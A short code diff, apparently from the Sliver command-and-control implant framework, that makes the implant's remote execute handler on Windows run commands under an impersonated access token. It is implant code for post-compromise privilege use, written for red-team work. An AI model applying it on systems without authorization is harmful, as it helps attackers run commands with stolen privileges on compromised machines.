@@ -33,6 +33,12 @@ import (
 	"log"
 	// {{end}}
 
+	// {{if eq .GOOS "windows"}}
+	"github.com/bishopfox/sliver/sliver/priv"
+	"golang.org/x/sys/windows"
+	"syscall"
+	// {{end}}
+
 	"os"
 	"path/filepath"
 
@@ -454,6 +460,12 @@ func executeHandler(data []byte, resp RPCResponse) {
 	}
 	execResp := &pb.Execute{}
 	cmd = exec.Command(execReq.Path)
+	//{{if eq .GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+	//{{end}}
+
 	if len(execReq.Args) != 0 {
 		cmd.Args = execReq.Args
 	}
